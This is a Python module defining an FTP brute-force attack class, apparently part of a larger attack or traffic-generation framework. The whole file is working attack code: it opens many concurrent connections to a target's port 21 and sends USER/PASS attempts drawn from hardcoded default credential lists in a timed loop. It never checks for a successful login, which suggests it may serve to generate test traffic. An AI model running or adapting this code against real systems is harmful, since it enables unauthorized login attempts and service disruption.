"""FTP Brute Force attack implementation"""

import asyncio
import logging
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class FTPBruteForce(BaseAttack):
    """FTP brute force attack"""
    
    def get_attack_type(self) -> str:
        return "FTP-BruteForce"
    
    def get_default_port(self) -> int:
        return 21
    
    async def _try_login(self, username, password):
        """Attempt FTP login"""
        port = self.target_port or self.get_default_port()
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_ip, port),
                timeout=5
            )
            
            # Read welcome banner
            await asyncio.wait_for(reader.read(1024), timeout=2)
            
            # Send USER command
            writer.write(f"USER {username}\r\n".encode())
            await writer.drain()
            await asyncio.wait_for(reader.read(1024), timeout=2)
            
            # Send PASS command
            writer.write(f"PASS {password}\r\n".encode())
            await writer.drain()
            await asyncio.wait_for(reader.read(1024), timeout=2)
            
            self.packets_sent += 3
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"FTP login attempt failed: {username}:{password} - {e}")
    
    async def _execute_attack(self):
        """Execute FTP brute force"""
        duration = self.parameters.get('duration', 300)
        
        usernames = ['ftp', 'admin', 'user', 'test', 'anonymous', 'guest']
        passwords = ['ftp', 'password', '123456', 'admin', '', 'test']
        
        logger.info(f"FTP-BruteForce: Starting attack on {self.target_ip}:21")
        
        start_time = asyncio.get_event_loop().time()
        
        while (asyncio.get_event_loop().time() - start_time) < duration:
            tasks = []
            for username in usernames:
                for password in passwords:
                    task = self._try_login(username, password)
                    tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
            if self.packets_sent % 100 == 0:
                logger.info(f"FTP-BruteForce: {self.packets_sent} attempts")
            
            await asyncio.sleep(1)
        
        logger.info(f"FTP-BruteForce: Attack complete. Total attempts: {self.packets_sent}")

